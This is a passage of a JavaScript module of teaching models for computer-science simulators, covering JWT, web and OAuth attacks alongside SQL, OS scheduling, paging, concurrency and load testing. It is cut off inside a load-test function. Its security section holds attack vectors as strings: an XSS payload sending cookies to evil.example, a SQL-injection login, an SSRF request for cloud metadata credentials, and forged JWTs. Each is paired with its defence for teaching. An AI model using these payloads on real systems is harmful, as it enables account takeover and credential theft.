// Models behind the CS-core simulators (core-sims.js draws them): security (JWT checks, web attacks,
// OAuth flows), SQL (joins, window functions), operating systems (CPU scheduling, page replacement,
// dining philosophers) and testing (load shapes). Pure: no DOM, no I/O, seeded randomness, so node can
// test them (tests/test_core_models.cjs). Teaching models: right about who wins and why, not benchmarks.
(function (root) {
  'use strict';
  const rng = seed => () => { seed |= 0; seed = seed + 0x6D2B79F5 | 0; let t = Math.imul(seed ^ seed >>> 15, 1 | seed); t = t + Math.imul(t ^ t >>> 7, 61 | t) ^ t; return ((t ^ t >>> 14) >>> 0) / 4294967296; };

  // ---------- Security: what a JWT verifier accepts ----------
  // The server signs RS256 tokens for audience "api". Each attack is a token; each check is a line of the
  // verifier. Without a pinned algorithm the verifier trusts the token's own `alg` header.
  const JWT_ATTACKS = {
    valid: { label: 'A genuine token for user 42', header: { alg: 'RS256', typ: 'JWT' }, payload: { sub: '42', role: 'user', aud: 'api', exp: '+1h' }, sig: 'RS256 signature by the server' },
    tamper: { label: 'Edit "role" to "admin", keep the old signature', header: { alg: 'RS256', typ: 'JWT' }, payload: { sub: '42', role: 'admin', aud: 'api', exp: '+1h' }, sig: 'the old signature (over role: user)', forged: true },
    none: { label: 'Set alg to "none", drop the signature', header: { alg: 'none', typ: 'JWT' }, payload: { sub: '1', role: 'admin', aud: 'api', exp: '+1h' }, sig: '(empty)', forged: true },
    confusion: { label: 'Switch to HS256, sign with the server\'s public key', header: { alg: 'HS256', typ: 'JWT' }, payload: { sub: '1', role: 'admin', aud: 'api', exp: '+1h' }, sig: 'HMAC using the public key as the secret', forged: true },
    expired: { label: 'Replay a stolen token that expired yesterday', header: { alg: 'RS256', typ: 'JWT' }, payload: { sub: '42', role: 'user', aud: 'api', exp: '-1d' }, sig: 'RS256 signature by the server' },
    audience: { label: 'Reuse a token issued for another service', header: { alg: 'RS256', typ: 'JWT' }, payload: { sub: '42', role: 'user', aud: 'billing', exp: '+1h' }, sig: 'RS256 signature by the server' },
  };
  function jwtVerify(attack, checks) {
    const tok = JWT_ATTACKS[attack], c = { sig: true, alg: true, exp: true, aud: true, ...checks }, steps = [];
    let ok = true;
    const fail = (text) => { steps.push({ ok: false, text }); ok = false; };
    steps.push({ ok: true, text: 'Split on dots and base64url-decode header and payload. (Anyone can do this: a JWT is signed, not encrypted.)' });
    if (!c.sig) steps.push({ ok: true, text: 'Signature: not checked. The server reads the claims as they are.', warn: true });
    else {
      const alg = c.alg ? 'RS256' : tok.header.alg;
      if (c.alg && tok.header.alg !== 'RS256') fail(`Algorithm: header says ${tok.header.alg}, but only RS256 is allowed. Rejected.`);
      else if (alg === 'none') steps.push({ ok: true, text: 'Algorithm taken from the header: "none", so there is no signature to check. Accepted.', warn: true });
      else if (alg === 'HS256') steps.push({ ok: true, text: 'Algorithm taken from the header: HS256. The verifier uses its key (the RSA public key, which is public) as the HMAC secret, and the attacker signed with that same public key. Signature matches.', warn: true });
      else if (attack === 'tamper') fail('Signature: RS256 over the edited payload does not match. Rejected.');
      else steps.push({ ok: true, text: 'Signature: valid RS256 by the server\'s private key.' });
    }
    if (ok) {
      if (tok.payload.exp === '-1d') { if (c.exp) fail('exp: expired a day ago. Rejected.'); else steps.push({ ok: true, text: 'exp: not checked.', warn: true }); }
      else steps.push({ ok: true, text: c.exp ? 'exp: still valid.' : 'exp: not checked.' });
    }
    if (ok) {
      if (tok.payload.aud !== 'api') { if (c.aud) fail(`aud: token is for "${tok.payload.aud}", not "api". Rejected.`); else steps.push({ ok: true, text: 'aud: not checked, so a token minted for another service works here.', warn: true }); }
      else steps.push({ ok: true, text: c.aud ? 'iss and aud: issued by us, for "api".' : 'aud: not checked.' });
    }
    const breach = ok && attack !== 'valid';
    return { accepted: ok, breach, steps, token: tok,
      outcome: ok ? (tok.payload.role === 'admin' ? 'Accepted as admin' : attack === 'valid' ? 'Accepted as user 42' : 'Accepted as user 42 (should not be)') : 'Rejected (401)' };
  }
  // True when these checks reject every attack and still accept the genuine token.
  const jwtSafe = checks => Object.keys(JWT_ATTACKS).every(a => jwtVerify(a, checks).accepted === (a === 'valid'));

  // ---------- Security: six web attacks against a set of defences ----------
  const WEB_DEFENCES = [
    ['encode', 'Escape output (auto-escaping templates)'], ['csp', 'Content-Security-Policy: script-src \'self\''],
    ['httponly', 'HttpOnly session cookie'], ['samesite', 'SameSite=Lax session cookie'], ['csrftoken', 'CSRF token on state-changing forms'],
    ['params', 'Parameterised SQL queries'], ['egress', 'URL fetcher: allow list, block private and link-local IPs'],
    ['imds', 'Cloud metadata needs a session token (IMDSv2)'], ['authz', 'Check ownership of every object on the server'],
    ['uuid', 'Random UUIDs instead of sequential IDs'], ['cors', 'CORS: fixed allow list, never reflect Origin'],
  ];
  const WEB_ATTACKS = {
    xss: { label: 'Stored XSS', vector: 'A comment containing <script>fetch(\'//evil.example/?c=\' + document.cookie)</script>' },
    csrf: { label: 'CSRF', vector: 'evil.example auto-submits <form method=POST action="https://bank.example/transfer">' },
    sqli: { label: 'SQL injection', vector: 'Login with username  admin\' --' },
    ssrf: { label: 'SSRF', vector: 'POST /preview {url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/app"}' },
    idor: { label: 'Broken object-level authorisation', vector: 'Logged in as Ana, GET /api/invoices/1002 (Ben\'s invoice)' },
    cors: { label: 'CORS misconfiguration', vector: 'evil.example runs fetch("https://api.example/me", {credentials: "include"}) and reads the reply' },
  };
  function webAttack(attack, d) {
    const on = k => !!d[k];
    const S = [], R = (outcome, text) => ({ attack, outcome, steps: S, text });
    if (attack === 'xss') {
      S.push('The comment is saved as-is and later rendered into other users\' pages.');
      if (on('encode')) return R('blocked', 'The template escapes it: the browser shows the text "<script>…" instead of running it.');
      S.push('The browser parses it as a real <script> element.');
      if (on('csp')) return R('blocked', 'CSP forbids inline scripts, so the browser refuses to run it (and reports the violation). A good second layer, not a substitute for escaping.');
      if (on('httponly')) return R('limited', 'The script runs but document.cookie has no session cookie. It can still call the API as the victim, read the page and change their settings. HttpOnly limits the damage; it does not stop XSS.');
      return R('breach', 'The script runs in every viewer\'s session and sends their session cookie to the attacker, who logs in as them.');
    }
    if (attack === 'csrf') {
      S.push('The victim, logged in to the bank, visits evil.example. The form posts to the bank.');
      if (on('samesite')) return R('blocked', 'SameSite=Lax: the browser does not attach the session cookie to a cross-site POST, so the bank sees an anonymous request.');
      S.push('The browser attaches the bank\'s session cookie, because cookies go with every request to their site by default.');
      if (on('csrftoken')) return R('blocked', 'The form lacks the secret per-session token that only the bank\'s own pages contain, so the request is rejected.');
      return R('breach', 'The bank sees an authenticated transfer request and moves the money. The attacker never saw the cookie; they did not need to.');
    }
    if (attack === 'sqli') {
      S.push('Server builds: SELECT * FROM users WHERE name = \'admin\' --\' AND password_hash = …');
      if (on('params')) return R('blocked', 'With a placeholder the driver sends the value separately: it is a string that matches no user. The quote never becomes SQL.');
      if (on('encode')) S.push('HTML escaping does not help: this is SQL, not a page.');
      return R('breach', 'The -- comments out the password check. The attacker is logged in as admin.');
    }
    if (attack === 'ssrf') {
      S.push('The server, inside the VPC, fetches the URL to build a link preview.');
      if (on('egress')) return R('blocked', 'The fetcher resolves the host, sees a link-local address (169.254.0.0/16) and refuses. It checks the resolved IP, so DNS tricks and redirects do not get round it.');
      S.push('169.254.169.254 is the cloud metadata service, reachable only from inside the instance.');
      if (on('imds')) return R('limited', 'IMDSv2 needs a PUT to get a session token first, which a simple GET-only fetcher cannot do, so the credentials are safe. The attacker can still reach other internal services (admin panels, databases on private IPs).');
      return R('breach', 'The reply contains the instance role\'s temporary AWS keys. The preview shows them to the attacker.');
    }
    if (attack === 'idor') {
      S.push('Ana is authenticated: the session is valid.');
      if (on('authz')) return R('blocked', 'The handler loads invoice 1002, sees owner = Ben, not Ana, and returns 404. Authentication said who she is; authorisation decides what she may see.');
      if (on('uuid')) return R('limited', 'IDs are no longer guessable by counting, but any leaked ID (a shared link, a log, a referrer) still opens the invoice. Obscurity, not authorisation.');
      return R('breach', 'The handler fetches by ID and returns Ben\'s invoice. Counting from 1 to 50,000 downloads everyone\'s.');
    }
    S.push('The browser sends the request to api.example, with cookies if the site allows them.');
    if (on('samesite')) return R('blocked', 'SameSite=Lax: the session cookie is not sent on a cross-site fetch, so /me returns 401 whatever CORS says. (A sibling subdomain counts as same-site, so CORS still matters.)');
    if (on('cors')) return R('blocked', 'The reply carries no Access-Control-Allow-Origin for evil.example, so the browser hides the response from the page. (The request still reached the server: CORS protects reads, not writes.)');
    return R('breach', 'The API echoes Origin: evil.example with Allow-Credentials: true. The browser lets evil.example read the victim\'s profile and API keys.');
  }
  function webBoard(defences) {
    const rows = Object.keys(WEB_ATTACKS).map(a => webAttack(a, defences));
    return { rows, breaches: rows.filter(r => r.outcome === 'breach').length, limited: rows.filter(r => r.outcome === 'limited').length,
      blocked: rows.filter(r => r.outcome === 'blocked').length, used: WEB_DEFENCES.filter(([k]) => defences[k]).length };
  }

  // ---------- Security: OAuth 2.0 flows under attack ----------
  const OAUTH_FLOWS = { pkce: 'Authorization code + PKCE (public client)', code: 'Authorization code, no PKCE (public client)', secret: 'Authorization code + client secret (backend)', implicit: 'Implicit (token in the redirect URL)' };
  const OAUTH_ATTACKS = { intercept: 'A malicious app intercepts the redirect', leak: 'The redirect URL leaks (history, logs, Referer)', csrf: 'Login CSRF: victim is sent the attacker\'s callback', redirect: 'Attacker sets redirect_uri to a page they control' };
  function oauth(flow, attack, opts = {}) {
    const state = !!opts.state, exact = !!opts.exact, S = [];
    const R = (outcome, text) => ({ outcome, text, steps: S });
    if (attack === 'intercept') {
      S.push('The phone has a second app registered for the same custom scheme (myapp://callback). It receives the redirect.');
      if (flow === 'implicit') return R('breach', 'The redirect itself carries the access token. The malicious app now holds it.');
      S.push('It now has the authorization code and calls the token endpoint with it.');
      if (flow === 'pkce') return R('blocked', 'The token endpoint asks for the code_verifier whose hash (code_challenge) was sent at the start. Only the real app has it. No token.');
      if (flow === 'secret') return R('blocked', 'The exchange needs the client secret, which lives on the backend. No token.');
      return R('breach', 'A public client has no secret, and without PKCE nothing ties the code to the app that asked for it. The malicious app gets tokens.');
    }
    if (attack === 'leak') {
      S.push('The callback URL ends up in browser history, a proxy log and the Referer header of the next page.');
      if (flow === 'implicit') return R('breach', 'The access token is in the URL fragment, and the page\'s scripts and history keep it. Anyone with the log can call the API until it expires.');
      if (flow === 'code') return R('limited', 'Only a code leaks. It is short-lived and single-use, so if the app has redeemed it first it is worthless; a fast attacker could race it.');
      return R('blocked', 'Only a single-use code leaks, and redeeming it needs the code_verifier or client secret.');
    }
    if (attack === 'csrf') {
      S.push('The attacker starts a login with their own account, stops at the callback, and gets the victim to open https://app/callback?code=ATTACKER_CODE.');
      if (flow === 'pkce') return R('blocked', 'The victim\'s app has no code_verifier for that code (it never started that flow), so the exchange fails. PKCE doubles as CSRF protection.');
      if (state) return R('blocked', 'The callback has no state matching one this browser stored at the start, so the app refuses it.');
      return R('breach', 'The app exchanges the code and logs the victim into the attacker\'s account. Anything the victim then uploads or links (a card, files) goes to the attacker.');
    }
    S.push('The attacker sends the victim an authorise link for the real client_id with redirect_uri=https://app.example.evil.net/cb (and, for PKCE, their own code_challenge).');
    if (exact) return R('blocked', 'The server compares redirect_uri with the registered one exactly and shows an error instead of redirecting.');
    S.push('The server only checks the prefix, so it accepts it. The victim signs in and the code (or token) is sent to the attacker\'s page.');
    if (flow === 'implicit') return R('breach', 'The token arrives at the attacker directly.');
    if (flow === 'secret') return R('blocked', 'The attacker has the code but not the client secret, so cannot redeem it. (Still fix the redirect check.)');
    if (flow === 'pkce') return R('breach', 'The attacker started this flow, so they own the code_verifier. PKCE proves "same party that started", not "the real app". Only exact redirect matching stops this.');
    return R('breach', 'The attacker redeems the code; a public client needs nothing else.');
  }
  const oauthSafe = (flow, opts) => Object.keys(OAUTH_ATTACKS).every(a => oauth(flow, a, opts).outcome === 'blocked');

  // ---------- SQL: joins over two tiny tables ----------
  const USERS = [{ id: 1, name: 'Ana', city: 'London' }, { id: 2, name: 'Ben', city: 'Paris' }, { id: 3, name: 'Cy', city: 'London' }, { id: 4, name: 'Dee', city: null }];
  const ORDERS = [{ id: 101, user_id: 1, total: 30, status: 'paid' }, { id: 102, user_id: 1, total: 45, status: 'refunded' }, { id: 103, user_id: 2, total: 20, status: 'paid' },
    { id: 104, user_id: 3, total: 25, status: 'refunded' }, { id: 105, user_id: null, total: 15, status: 'paid' }];
  const JOIN_SQL = { inner: 'JOIN', left: 'LEFT JOIN', right: 'RIGHT JOIN', full: 'FULL JOIN', cross: 'CROSS JOIN', anti: 'LEFT JOIN', semi: 'semi' };
  function sqlJoin({ join = 'inner', filter = 'none', agg = 'none' } = {}) {
    const paid = o => o && o.status === 'paid';
    const on = (u, o) => join === 'cross' || (o.user_id === u.id && (filter !== 'on' || paid(o)));
    const NU = { id: null, name: null, city: null }, NO = { id: null, user_id: null, total: null, status: null };
    let rows = [];
    if (join === 'semi') rows = USERS.filter(u => ORDERS.some(o => o.user_id === u.id && (filter === 'none' || paid(o)))).map(u => ({ u, o: null }));
    else {
      const matchedO = new Set();
      for (const u of USERS) {
        const ms = ORDERS.filter(o => on(u, o));
        ms.forEach(o => matchedO.add(o.id));
        if (ms.length) ms.forEach(o => rows.push({ u, o }));
        else if (['left', 'full', 'anti'].includes(join)) rows.push({ u, o: NO });
      }
      if (['right', 'full'].includes(join)) ORDERS.filter(o => !matchedO.has(o.id)).forEach(o => rows.push({ u: NU, o }));
      if (join === 'anti') rows = rows.filter(r => r.o.id === null);
      if (filter === 'where') rows = rows.filter(r => paid(r.o));   // NULL = 'paid' is unknown, so null-extended rows go
    }
    let cols, out;
    if (agg !== 'none' && join !== 'semi') {
      const by = new Map();
      for (const r of rows) { const k = r.u.id; if (!by.has(k)) by.set(k, { name: r.u.name, n: 0 }); by.get(k).n += agg === 'star' ? 1 : (r.o && r.o.id !== null ? 1 : 0); }
      cols = ['u.name', agg === 'star' ? 'COUNT(*)' : 'COUNT(o.id)'];
      out = [...by.values()].map(g => [g.name, g.n]);
    } else if (join === 'semi' || join === 'anti') { cols = ['u.id', 'u.name']; out = rows.map(r => [r.u.id, r.u.name]); }
    else { cols = ['u.id', 'u.name', 'o.id', 'o.total', 'o.status']; out = rows.map(r => [r.u.id, r.u.name, r.o.id, r.o.total, r.o.status]); }
    const ids = new Set(rows.map(r => r.u.id));
    const fcl = filter === 'none' ? '' : " AND o.status = 'paid'";
    const sql = join === 'semi' ? `SELECT u.id, u.name\nFROM users u\nWHERE EXISTS (SELECT 1 FROM orders o\n              WHERE o.user_id = u.id${filter === 'none' ? '' : "\n                AND o.status = 'paid'"})`
      : `SELECT ${cols.join(', ')}\nFROM users u\n${JOIN_SQL[join]} orders o${join === 'cross' ? '' : `\n  ON o.user_id = u.id${filter === 'on' ? fcl : ''}`}${join === 'anti' ? '\nWHERE o.id IS NULL' + (filter === 'where' ? fcl : '') : filter === 'where' ? "\nWHERE o.status = 'paid'" : ''}${agg !== 'none' ? '\nGROUP BY u.id, u.name' : ''}`;
    const nulls = out.reduce((n, r) => n + r.filter(v => v === null).length, 0);
    return { cols, rows: out, sql, n: out.length, nulls, ids,
      allUsers: USERS.every(u => ids.has(u.id)) ? 1 : 0,
      neverOrdered: join === 'anti' && JSON.stringify(out) === '[[4,"Dee"]]' ? 1 : 0,
      noPaid: join === 'anti' && JSON.stringify(out) === '[[3,"Cy"],[4,"Dee"]]' ? 1 : 0 };
  }
  const sameRows = (a, b) => JSON.stringify([...a.rows].map(String).sort()) === JSON.stringify([...b.rows].map(String).sort());

  // ---------- SQL: window functions ----------
  const SALES = [
    { month: 1, region: 'North', rep: 'Ana', amount: 120 }, { month: 1, region: 'South', rep: 'Eve', amount: 80 },
    { month: 2, region: 'North', rep: 'Ben', amount: 90 }, { month: 2, region: 'South', rep: 'Fay', amount: 80 },
    { month: 3, region: 'North', rep: 'Cy', amount: 120 }, { month: 3, region: 'South', rep: 'Gus', amount: 150 },
    { month: 4, region: 'North', rep: 'Ana', amount: 60 }, { month: 4, region: 'South', rep: 'Eve', amount: 80 },
  ];
  const MONTHS = ['', 'Jan', 'Feb', 'Mar', 'Apr'];
  const WIN_FN = { row_number: 'ROW_NUMBER()', rank: 'RANK()', dense_rank: 'DENSE_RANK()', sum: 'SUM(amount)', lag: 'LAG(amount)', avg3: 'AVG(amount)', groupby: 'SUM(amount) … GROUP BY' };
  function sqlWindow({ fn = 'row_number', part = 'region', order = 'amount', frame = 'range', top = false } = {}) {
    const key = r => part === 'region' ? r.region : '';
    const cmp = order === 'amount' ? (a, b) => b.amount - a.amount || a.month - b.month : (a, b) => a.month - b.month || a.region.localeCompare(b.region);
    const ordv = r => order === 'amount' ? r.amount : r.month;
    if (fn === 'groupby') {
      const g = new Map();
      SALES.forEach(r => g.set(key(r) || 'all', (g.get(key(r) || 'all') || 0) + r.amount));
      return { cols: [part === 'region' ? 'region' : '(no grouping)', 'SUM(amount)'], rows: [...g].map(([k, v]) => [k, v]), n: g.size, collapsed: 1,
        sql: `SELECT ${part === 'region' ? 'region, ' : ''}SUM(amount)\nFROM sales${part === 'region' ? '\nGROUP BY region' : ''}`, gap: 0, peerShared: 0, topOk: 0 };
    }
    const groups = new Map();
    SALES.forEach(r => { const k = key(r); if (!groups.has(k)) groups.set(k, []); groups.get(k).push(r); });
    const out = [];
    let gap = 0, peerShared = 0;
    for (const [, rows] of [...groups].sort((a, b) => a[0].localeCompare(b[0]))) {
      const s = [...rows].sort(cmp);
      let rank = 0, dense = 0, prev = null;
      s.forEach((r, i) => {
        const v = ordv(r), tie = prev !== null && v === prev;
        if (!tie) { rank = i + 1; dense++; }
        if (fn === 'rank' && !tie && i > 0 && rank !== dense) gap = 1;
        prev = v;
        let val;
        if (fn === 'row_number') val = i + 1;
        else if (fn === 'rank') val = rank;
        else if (fn === 'dense_rank') val = dense;
        else if (fn === 'sum') {
          const last = frame === 'rows' ? i : s.reduce((m, x, j) => (ordv(x) === v ? j : m), i);
          val = s.slice(0, last + 1).reduce((t, x) => t + x.amount, 0);
          if (frame === 'range' && last > i) peerShared = 1;
        } else if (fn === 'lag') val = i ? s[i - 1].amount : null;
        else val = Math.round(s.slice(Math.max(0, i - 2), i + 1).reduce((t, x) => t + x.amount, 0) / Math.min(i + 1, 3));
        out.push({ r, val });
      });
    }
    const ranking = ['row_number', 'rank', 'dense_rank'].includes(fn);
    const kept = top && ranking ? out.filter(x => x.val <= 2) : out;
    const over = `OVER (${part === 'region' ? 'PARTITION BY region ' : ''}ORDER BY ${order === 'amount' ? 'amount DESC' : 'month'}${fn === 'sum' && frame === 'rows' ? '\n             ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW' : fn === 'avg3' ? '\n             ROWS BETWEEN 2 PRECEDING AND CURRENT ROW' : ''})`;
    const sel = `SELECT month, region, rep, amount,\n       ${WIN_FN[fn]} ${over} AS v\nFROM sales`;
    const sql = top && ranking ? `WITH ranked AS (\n${sel.replace(/^/gm, '  ')}\n)\nSELECT * FROM ranked WHERE v <= 2` : sel;
    const per = new Map(); kept.forEach(x => per.set(x.r.region, (per.get(x.r.region) || 0) + 1));
    const topOk = top && ranking && part === 'region' && order === 'amount' && [...per.values()].every(n => n >= 2) ? 1 : 0;
    return { cols: ['month', 'region', 'rep', 'amount', 'v'], rows: kept.map(x => [MONTHS[x.r.month], x.r.region, x.r.rep, x.r.amount, x.val]), n: kept.length,
      sql, gap, peerShared, topOk, collapsed: 0, perRegion: Object.fromEntries(per) };
  }

  // ---------- OS: CPU scheduling ----------
  const SCHED_LOADS = {
    convoy: [{ name: 'P1', at: 0, burst: 24 }, { name: 'P2', at: 1, burst: 3 }, { name: 'P3', at: 2, burst: 3 }, { name: 'P4', at: 3, burst: 2 }],
    mixed: [{ name: 'batch', at: 0, burst: 14 }, { name: 'web1', at: 1, burst: 2 }, { name: 'web2', at: 3, burst: 3 }, { name: 'build', at: 4, burst: 9 }, { name: 'web3', at: 8, burst: 2 }, { name: 'web4', at: 12, burst: 1 }],
    equal: [{ name: 'A', at: 0, burst: 6 }, { name: 'B', at: 0, burst: 6 }, { name: 'C', at: 0, burst: 6 }, { name: 'D', at: 0, burst: 6 }],
  };
  function schedule({ load = 'convoy', algo = 'fcfs', q = 4, cs = 0 } = {}) {
    const P = SCHED_LOADS[load].map((p, i) => ({ ...p, i, rem: p.burst, first: null, done: null, level: 0 }));
    const n = P.length, ticks = P.map(() => []), cpu = [];
    const MLQ = [2, 4, Infinity];
    let t = 0, cur = null, slice = 0, last = null, switching = 0, switchTicks = 0, switches = 0, pending = null;
    const ready = [], arrived = new Set();
    const quantum = p => algo === 'mlfq' ? MLQ[p.level] : algo === 'rr' ? q : Infinity;
    const pick = () => {
      if (!ready.length) return null;
      let k = 0;
      if (algo === 'sjf' || algo === 'srtf') ready.forEach((p, j) => { if (p.rem < ready[k].rem || (p.rem === ready[k].rem && p.at < ready[k].at)) k = j; });
      if (algo === 'mlfq') ready.forEach((p, j) => { if (p.level < ready[k].level) k = j; });
      return ready.splice(k, 1)[0];
    };
    while (P.some(p => p.done === null) && t < 500) {
      P.forEach(p => { if (p.at === t && !arrived.has(p.i)) { arrived.add(p.i); ready.push(p); } });
      if (cur && !switching) {
        if (algo === 'srtf' && ready.some(p => p.rem < cur.rem)) { ready.push(cur); cur = null; }
        else if (slice >= quantum(cur)) { if (algo === 'mlfq') cur.level = Math.min(2, cur.level + 1); ready.push(cur); cur = null; }
        else if (algo === 'mlfq' && ready.some(p => p.level < cur.level)) { ready.push(cur); cur = null; }
      }
      if (!cur && !switching) {
        const nx = pick();
        if (nx) {
          if (last && last !== nx && cs > 0) { switching = cs; pending = nx; switches++; }
          else { if (last && last !== nx) switches++; cur = nx; slice = 0; }
        }
      }
      if (switching) {
        switching--; switchTicks++; cpu.push('switch');
        if (!switching) { cur = pending; pending = null; slice = 0; }
        P.forEach(p => ticks[p.i].push(arrived.has(p.i) && p.done === null ? 'wait' : null));
      } else if (cur) {
        if (cur.first === null) cur.first = t;
        cur.rem--; slice++; cpu.push('run');
        P.forEach(p => ticks[p.i].push(p === cur ? 'run' : arrived.has(p.i) && p.done === null ? 'wait' : null));
        last = cur;
        if (!cur.rem) { cur.done = t + 1; cur = null; }
      } else { cpu.push(null); P.forEach(p => ticks[p.i].push(null)); }
      t++;
    }
    const segs = ticks.map(tk => { const out = []; tk.forEach((s, k) => { if (!s) return; const l = out[out.length - 1]; if (l && l.state === s && l.to === k) l.to = k + 1; else out.push({ state: s, from: k, to: k + 1 }); }); return out; });
    const rows = P.map(p => ({ name: p.name, at: p.at, burst: p.burst, first: p.first, done: p.done, turnaround: p.done - p.at, wait: p.done - p.at - p.burst, response: p.first - p.at }));
    const avg = k => rows.reduce((s, r) => s + r[k], 0) / n;
    return { rows, segs, cpu, makespan: t, avgWait: avg('wait'), avgTurn: avg('turnaround'), avgResp: avg('response'), switches, switchTicks, overhead: t ? switchTicks / t : 0 };
  }

  // ---------- OS: page replacement ----------
  const REF_STRINGS = {
    belady: [1, 2, 3, 4, 1, 2, 5, 1, 2, 3, 4, 5],
    loop: [1, 2, 3, 4, 5, 1, 2, 3, 4, 5, 1, 2, 3, 4, 5],
    locality: [7, 0, 1, 2, 0, 3, 0, 4, 2, 3, 0, 3, 2, 1, 2, 0, 1, 7, 0, 1],
  };
  function paging({ string = 'locality', algo = 'lru', frames = 3 } = {}) {
    const refs = REF_STRINGS[string], F = [], cols = [];
    const lastUse = new Map(), loaded = new Map(), refbit = new Map();
    let hand = 0, faults = 0;
    refs.forEach((pg, t) => {
      let victim = null, hit = F.includes(pg);
      if (hit) { refbit.set(pg, 1); }
      else {
        faults++;
        if (F.length < frames) F.push(pg);
        else {
          let k = 0;
          if (algo === 'fifo') F.forEach((x, j) => { if (loaded.get(x) < loaded.get(F[k])) k = j; });
          else if (algo === 'lru') F.forEach((x, j) => { if (lastUse.get(x) < lastUse.get(F[k])) k = j; });
          else if (algo === 'opt') {
            const next = x => { const j = refs.indexOf(x, t + 1); return j < 0 ? Infinity : j; };
            F.forEach((x, j) => { if (next(x) > next(F[k])) k = j; });
          } else {
            for (;;) { if (refbit.get(F[hand])) { refbit.set(F[hand], 0); hand = (hand + 1) % frames; } else { k = hand; hand = (hand + 1) % frames; break; } }
          }
          victim = F[k]; F[k] = pg;
        }
        loaded.set(pg, t); refbit.set(pg, 1);
      }
      lastUse.set(pg, t);
      cols.push({ pg, hit, victim, frames: [...F], bits: algo === 'clock' ? F.map(x => refbit.get(x)) : null });
    });
    return { refs, cols, faults, hits: refs.length - faults, rate: (refs.length - faults) / refs.length };
  }
  const faultCurve = (string, algo) => [1, 2, 3, 4, 5, 6, 7].map(f => paging({ string, algo, frames: f }).faults);

  // ---------- OS: dining philosophers ----------
  // Each philosopher thinks, gets hungry, takes two forks (one at a time), eats, puts both down.
  // Strategies: naive (left then right), ordered (lower-numbered fork first), trylock (drop the first
  // fork if the second is busy, back off), waiter (a semaphore lets at most N-1 reach for forks).
  function philosophers({ n = 5, strategy = 'naive', think = 3, eat = 3, ticks = 600, seed = 1 } = {}) {
    const r = rng(seed), fork = new Array(n).fill(null);
    const ph = Array.from({ length: n }, (_, i) => ({ i, state: 'thinking', timer: 1 + Math.floor(r() * think), has: [], meals: 0, since: -1, worst: 0 }));
    const firstOf = i => strategy === 'ordered' ? Math.min(i, (i + 1) % n) : i;
    const secondOf = i => strategy === 'ordered' ? Math.max(i, (i + 1) % n) : (i + 1) % n;
    let seated = 0, retries = 0, t = 0, deadlock = null;
    for (; t < ticks; t++) {
      const order = ph.map(p => p.i).sort(() => r() - 0.5);
      for (const i of order) {
        const p = ph[i];
        if (p.state === 'thinking' || p.state === 'backoff') { if (--p.timer <= 0) { if (p.state === 'thinking') p.since = t; p.state = 'hungry'; } continue; }
        if (p.state === 'eating') {
          if (--p.timer <= 0) { p.has.forEach(f => { fork[f] = null; }); p.has = []; if (strategy === 'waiter') seated--; p.meals++; p.worst = Math.max(p.worst, t - p.since); p.since = -1; p.state = 'thinking'; p.timer = 1 + Math.floor(r() * think); }
          continue;
        }
        const a = firstOf(i), b = secondOf(i);
        if (!p.has.length) {
          if (strategy === 'waiter' && seated >= n - 1) continue;
          if (fork[a] === null) { fork[a] = i; p.has.push(a); if (strategy === 'waiter') seated++; }
        } else if (fork[b] === null) { fork[b] = i; p.has.push(b); p.state = 'eating'; p.timer = 1 + Math.floor(r() * eat); }
        else if (strategy === 'trylock') { fork[a] = null; p.has = []; p.state = 'backoff'; p.timer = 1 + Math.floor(r() * 3); retries++; }
      }
      if (strategy !== 'trylock' && ph.every(p => p.state === 'hungry' && p.has.length === 1 && fork[secondOf(p.i)] !== null)) { deadlock = t; break; }
    }
    const end = t >= ticks ? ticks : t + 1;
    const worst = Math.max(...ph.map(p => Math.max(p.worst, p.state === 'hungry' ? end - p.since : 0)));
    return { deadlock, meals: ph.reduce((s, p) => s + p.meals, 0), retries, worst, ticks: end,
      snapshot: { forks: [...fork], ph: ph.map(p => ({ state: p.state, has: [...p.has], wants: p.state === 'hungry' ? (p.has.length ? secondOf(p.i) : firstOf(p.i)) : null, meals: p.meals })) } };
  }
  function philosopherTrials(p, trials = 100) {
    let dead = 0, meals = 0, worst = 0, retries = 0, example = null;
    for (let s = 1; s <= trials; s++) {
      const x = philosophers({ ...p, seed: s });
      if (x.deadlock !== null) { dead++; if (!example) example = x; }
      meals += x.meals / x.ticks; worst = Math.max(worst, x.worst); retries += x.retries;
    }
    return { rate: dead / trials, deadlocks: dead, mealsPer100: Math.round(meals / trials * 100 * 10) / 10, worst, retries: Math.round(retries / trials), example: example || philosophers({ ...p, seed: 1 }) };
  }

  // ---------- Testing: what each test shape finds ----------
  // A service with up to three hidden flaws: a slow memory leak, a connection pool that caps throughput,
  // and an autoscaler that takes three minutes to add capacity. Each test shape exposes some of them.
  const TEST_SHAPES = {
    load: { label: 'Load test: expected peak (300 rps) for 30 min', minutes: 30 },
    stress: { label: 'Stress test: ramp from 100 to 1,300 rps over an hour', minutes: 60 },
    spike: { label: 'Spike test: 50 → 650 rps in seconds, for 7 min', minutes: 20 },
    soak: { label: 'Soak test: 300 rps for 12 hours', minutes: 720 },
  };
  const HW = 1100;   // the most the autoscaler can ever add: the known ceiling
  function loadTest({ shape = 'load', leak = true, pool = true, coldScale = true } = {}) {
    const S = TEST_SHAPES[shape], pts = 120, dt = S.minutes / pts, out = [], found = new Set();
    const poolCap = pool ? 700 : Infinity;
    let capacity = 400, mem = 900, restarts = 0;
    for (let k = 0; k <= pts; k++) {
      const m = k * dt;
      const rps = shape === 'stress' ? 100 + 1200 * k / pts : shape === 'spike' ? (m >= 5 && m < 12 ? 650 : 50) : 300;
      const target = Math.min(HW, Math.max(400, rps * 1.3));
      capacity += (target - capacity) * (coldScale ? Math.min(1, dt / 3) : 1);
      const limit = Math.min(capacity, poolCap), served = Math.min(rps, limit);
      let err = (rps - served) / rps;
      if (leak) mem += 2 * dt * served / 300;   // about 2 MB a minute at 300 rps
      if (mem > 2048) { found.add('leak'); restarts++; mem = 900; err = 1; }
      const util = rps / limit;
      let p99 = util < 1 ? 40 + 30 * util ** 4 / (1.05 - util) : 2000;
      if (leak && mem > 1700) p99 += (mem - 1700) * 2;   // GC thrashes as the heap fills
      if (rps > limit * 1.01) found.add(target >= HW && limit === capacity ? 'ceiling' : limit === poolCap ? 'pool' : 'cold');
      out.push({ m, rps, served, err, p99: Math.min(p99, 2500), mem, limit });
    }
    const peakErr = Math.max(...out.map(x => x.err)), worstP99 = Math.max(...out.map(x => x.p99));
    const breakAt = (out.find(x => x.rps > x.limit * 1.01) || {}).rps;
